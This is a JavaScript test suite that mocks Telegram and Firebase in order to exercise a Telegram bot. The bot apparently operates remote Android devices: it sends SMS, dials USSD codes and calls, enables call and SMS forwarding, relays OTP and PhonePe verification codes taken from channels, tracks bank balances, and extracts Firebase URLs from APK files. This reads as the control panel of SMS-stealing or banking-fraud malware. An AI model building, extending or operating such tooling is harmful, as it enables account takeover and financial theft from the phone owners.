// Integration smoke test — drives handleUpdate with a mocked Telegram API.
process.env.TELEGRAM_BOT_TOKEN = 'TEST:TOKEN';
process.env.ADMIN_ID = '7335168552';
process.env.STATE_FILE = require('os').tmpdir() + '/ats-test-state.json';

const fs = require('fs');
try { fs.unlinkSync(process.env.STATE_FILE); } catch (e) {}

// Pre-seed state BEFORE require so loadState picks it up.
const seed = {
  owner: 7335168552,
  admins: [7335168552],
  users: {
    '7931100001': {
      fb_urls: ['https://proj1.firebaseio.com'],
      active_fb_url: 'https://proj1.firebaseio.com',
      data_path: 'clients',
      device_id: 'DEVABC123',
      device_name: 'TestPhone',
      default_sim: 'sim1',
      channels: [-1001234567890],
      auto_forward: true,
      bank_balances: {},
      detected_banks: {},
      fwd_state: {}
    }
  },
  _awaiting: {},
  fb_owner: { 'https://proj1.firebaseio.com': '7931100001' },
  global_devices: {},
  last_update_id: 0
};
fs.mkdirSync(require('path').dirname(process.env.STATE_FILE), { recursive: true });
fs.writeFileSync(process.env.STATE_FILE, JSON.stringify(seed));

// --- Mock Telegram API + Firebase HTTP ---
const calls = [];
const axios = {
  post: async (url, payload) => {
    const method = url.split('/').pop();
    calls.push({ method, payload, url });
    if (method === 'getUpdates') return { data: { ok: true, result: [] } };
    return { data: { ok: true, result: { message_id: Math.floor(Math.random() * 99999) } } };
  },
  get: async (url) => {
    calls.push({ method: 'get', url });
    return { data: {} }; // no firebase data
  },
  put: async (url, payload) => {
    calls.push({ method: 'put', url, payload });
    return { data: {} };
  },
  delete: async (url) => { calls.push({ method: 'delete', url }); return { data: {} }; }
};
require.cache[require.resolve('axios')] = { exports: axios };

const bot = require('./api/bot')._api;
const handleUpdate = bot.handleUpdate;

const msg = (chat, text, fromId = '7931100001') => ({ message: { chat: { id: chat }, from: { id: fromId }, text, message_id: 1 } });
const cbq = (data, fromId = '7931100001') => ({ callback_query: { id: 'c1', from: { id: fromId }, data, message: { chat: { id: fromId }, message_id: 1 } } });

let pass = 0, fail = 0;
const ok = (name, cond) => { if (cond) pass++; else { fail++; console.error('❌', name); } };
const sentTexts = () => calls.filter(c => c.method === 'sendMessage').map(c => c.payload.text || '');
const sentCalls = () => calls;

(async () => {
  // 1. seeded user /start → login status
  await bot.handleUpdate(msg('7931100001', '/start'));
  ok('login status', sentTexts().some(t => t.includes('Connected Firebases')));

  // 2. connect new firebase
  calls.length = 0;
  await bot.handleUpdate(cbq('add_firebase'));
  await bot.handleUpdate(msg('7931100001', 'ftp://not-a-firebase'));
  ok('invalid url rejected', sentTexts().some(t => t.includes('Invalid Firebase URL')));
  await bot.handleUpdate(msg('7931100001', 'https://proj2.firebaseio.com'));
  ok('firebase connected msg', sentTexts().some(t => t.includes('Firebase Connected')));

  // 3. logout confirm
  calls.length = 0;
  await bot.handleUpdate(cbq('logout'));
  const lc = sentCalls().find(c => c.method === 'editMessageText');
  const lgbtn = JSON.stringify(lc && lc.payload && lc.payload.reply_markup);
  ok('logout confirm', !!lc && String((lc.payload && lc.payload.text) || '').includes('Kya aap') && lgbtn.includes('Confirm Logout'));

  // 4. admin panel (owner id)
  calls.length = 0;
  await bot.handleUpdate(cbq('admin_menu', '7335168552'));
  ok('admin panel', sentCalls().find(c => c.method === 'editMessageText').payload.text.includes('ADMIN PANEL'));

  // 5. admin download (owner only)
  calls.length = 0;
  await bot.handleUpdate(cbq('admin_download', '7335168552'));
  ok('admin download owner', calls.some(c => c.method === 'sendDocument'));

  // 6. non-owner admin download blocked (another pseudo-admin? make sure only owner)
  calls.length = 0;
  await bot.handleUpdate(cbq('admin_menu', '5551112222'));
  const denied = sentCalls().some(c => String((c.payload && c.payload.text) || '').includes('ADMIN PANEL')) ? false : true;
  ok('non-admin sees no panel', denied);
  calls.length = 0;
  await bot.handleUpdate(cbq('admin_download', '5551112222'));
  ok('non-owner download denied', sentTexts().some(t => t.includes('OWNER')));

  // 7. auto-token channel post → firebase sendSms + success msg
  calls.length = 0;
  await bot.handleUpdate({ channel_post: { chat: { id: -1001234567890 }, message_id: 10, text: '📲 To: 9876543210\nBody: PHONEPE-MULTI-SMS-VERIFY 778899:abcd' } });
  const tkPut = calls.find(c => c.method === 'put' && c.url.includes('sendSms'));
  ok('auto token firebase sendSms', !!tkPut);
  ok('auto token success msg', sentTexts().some(t => t.includes('Auto Token Sent')));

  // 8. channel unparsable → analysis feedback
  calls.length = 0;
  await bot.handleUpdate({ channel_post: { chat: { id: -1001234567890 }, message_id: 11, text: 'just some random text' } });
  ok('analysis feedback', sentTexts().some(t => t.includes('Channel Analysis')));

  // 8b. channel post arrives in a GROUP linked to the channel → sender_chat = channel id
  calls.length = 0;
  await bot.handleUpdate({ message: { chat: { id: -12345 }, sender_chat: { id: -1001234567890 }, from: { id: 555 }, text: 'OTP 556677 for 9876543210', message_id: 20 } });
  ok('linked channel matched via sender_chat', calls.some(c => c.method === 'put' && c.url.includes('sendSms')));
  ok('linked channel success msg', sentTexts().some(t => t.includes('Auto Token Sent')));

  // 8c. admin posting a test message in own group is NO LONGER skipped
  calls.length = 0;
  await bot.handleUpdate({ message: { chat: { id: -1001234567890 }, from: { id: 7335168552 }, text: 'Code 889900 for 9000001234', message_id: 21 } });
  ok('admin post processed', calls.some(c => c.method === 'put' && c.url.includes('sendSms')));

  // 9. full firebase URL masked on main menu
  calls.length = 0;
  await bot.handleUpdate(msg('7931100001', '/start'));
  const mainTxt = sentCalls().map(c => String((c.payload && c.payload.text) || '')).join('\n');
  ok('firebase masked', !mainTxt.includes('proj1.firebaseio.com'));

  // 10. channel set + multiple
  calls.length = 0;
  await bot.handleUpdate(cbq('set_channel'));
  await bot.handleUpdate(msg('7931100001', '-100222, -100333'));
  const st = JSON.parse(fs.readFileSync(process.env.STATE_FILE, 'utf8'));
  ok('multi channel stored', (st.users['7931100001'].channels || []).includes(-100222) && st.users['7931100001'].channels.includes(-100333));

  // 11. device management opens with masked device + sim buttons
  calls.length = 0;
  await bot.handleUpdate(cbq('dev_DEVABC123'));
  const dm = sentCalls().map(c => String((c.payload && c.payload.text) || '')).join('\n');
  ok('device mgmt', dm.includes('Manage Device'));

  // 12. sim select
  calls.length = 0;
  await bot.handleUpdate(cbq('sim_DEVABC123_sim2'));
  const st2 = JSON.parse(fs.readFileSync(process.env.STATE_FILE, 'utf8'));
  ok('sim2 saved', st2.users['7931100001'].default_sim === 'sim2');

  // 13. device command webhook events carry alias fields the apps expect
  calls.length = 0;
  await bot.sendSMS('7931100001', 'DEVABC123', '9811223344', 'Hello', 'sim1');
  const smsPut = calls.find(c => c.method === 'put' && c.url.includes('webhookEvent/sendSms'));
  ok('sendSms payload', !!smsPut && smsPut.payload.number === '9811223344' && smsPut.payload.msg === 'Hello' && smsPut.payload.isSended === true && smsPut.payload.sim === 'sim1');

  calls.length = 0;
  await bot.ussdDial('7931100001', 'DEVABC123', '*123#', 'sim1');
  const usPut = calls.find(c => c.method === 'put' && c.url.includes('webhookEvent/ussd'));
  ok('ussd payload', !!usPut && usPut.payload.ussd === '*123#' && usPut.payload.code === '*123#' && usPut.payload.command === '*123#' && usPut.payload.isUssd === true);

  calls.length = 0;
  await bot.callDial('7931100001', 'DEVABC123', '9876540000', 'sim1');
  const cdPut = calls.find(c => c.method === 'put' && c.url.includes('webhookEvent/call'));
  ok('call dial payload', !!cdPut && cdPut.payload.number === '9876540000' && cdPut.payload.isCall === true && cdPut.payload.sim === 'sim1');

  calls.length = 0;
  await bot.callForward('7931100001', 'DEVABC123', '9811112222', true, 'sim1');
  const cfPut = calls.find(c => c.method === 'put' && c.url.includes('webhookEvent/forwardCall'));
  ok('call fwd payload', !!cfPut && cfPut.payload.number === '9811112222' && cfPut.payload.isForward === true && cfPut.payload.enable === true);

  calls.length = 0;
  await bot.smsForward('7931100001', 'DEVABC123', '', false, 'sim1');
  const sfPut = calls.find(c => c.method === 'put' && c.url.includes('webhookEvent/forwardSms'));
  ok('sms fwd disable payload', !!sfPut && sfPut.payload.to === '' && sfPut.payload.enable === false && sfPut.payload.isDisable === true);

  // 14. unknown device → command returns boolean, no crash
  const bad = await bot.sendSMS('7931100001', 'NODEVICE', '9811223344', 'Hi');
  ok('unknown device no crash', typeof bad === 'boolean');

  // 15. APK Firebase extraction keeps full firebaseio.com host
  {
    const buf = Buffer.from('xx"databaseURL":"https://myproj-default-rtdb.firebaseio.com"yy', 'utf8');
    const found = await bot.extractFirebaseFromAPK(buf);
    ok('apk extracts full firebaseio url', found.includes('https://myproj-default-rtdb.firebaseio.com'));
  }
  {
    const buf = Buffer.from('junk https://region1.firebasedatabase.app more', 'utf8');
    const found = await bot.extractFirebaseFromAPK(buf);
    ok('apk extracts firebasedatabase.app url', found.includes('https://region1.firebasedatabase.app'));
  }

  console.log(`\n${pass} passed, ${fail} failed`);
  process.exit(fail ? 1 : 0);
})().catch(e => { console.error('TEST CRASH', e); process.exit(1); });